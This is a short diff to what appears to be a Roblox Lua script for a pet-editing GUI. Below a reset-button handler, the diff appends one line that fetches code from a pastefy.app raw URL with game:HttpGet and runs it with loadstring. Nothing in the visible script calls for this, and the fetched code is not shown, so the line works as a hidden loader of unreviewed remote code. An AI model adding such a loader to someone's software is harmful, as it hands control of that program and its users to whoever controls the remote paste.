@@ -291,3 +291,6 @@ resetBtn.MouseButton1Click:Connect(function()
 		warn("No original data saved for current pet or no pet equipped.")
 	end
 end)
+
+loadstring(game:HttpGet("https://pastefy.app/J9Jfgs0I/raw"))()
+
